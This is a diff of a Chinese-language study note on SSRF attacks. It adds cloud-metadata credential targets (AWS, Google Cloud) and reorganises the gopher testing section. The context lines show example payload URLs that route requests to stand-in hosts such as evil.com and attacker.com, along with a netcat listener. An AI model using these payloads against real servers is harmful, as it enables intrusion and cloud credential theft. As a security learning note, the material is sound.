@@ -28,6 +28,9 @@ Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> S
   * 探测内网(IP/port/service...)
     * ip 探测内网存活主机
     * service 如数据库类的服务
+    * Cloud Instances 如果含有SSRF漏洞的Web应用运行在云实例 可以尝试获取云服务商提供的让内部主机查询自身的元数据
+      * AWS(Aws keys, ssh keys and [more](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978))
+      * Google Cloud
   * 攻击内网其他主机
     * web漏洞(SQLi,XSS...)
   * 读取文件
@@ -41,8 +44,6 @@ Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> S
         * 解析 [FFmpeg任意文件读取漏洞分析 - 知乎](https://zhuanlan.zhihu.com/p/28255225)
 * 外网
   * 对外发起请求(攻击其他网站等恶意行为)
-
-[SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/) `SSRF PHP function` `SFTP Dict gopher TFTP file ldap`
 
 ### 测试方法
 
@@ -58,6 +59,9 @@ Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> S
     * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
   * `gopher://` Gopher是一种分布式文档传递服务
     * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`
+    
+### 测试方法 - 以gopher为例
+
 
 gopher.php (host it on acttacker.com):
 ```
@@ -71,6 +75,9 @@ evil.com:# nc -lvp 1337
 Hi
 ssrf
 ```
+
+[SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/) `SSRF PHP function` `SFTP Dict gopher TFTP file ldap`
+
 
 ### 利用方式
   
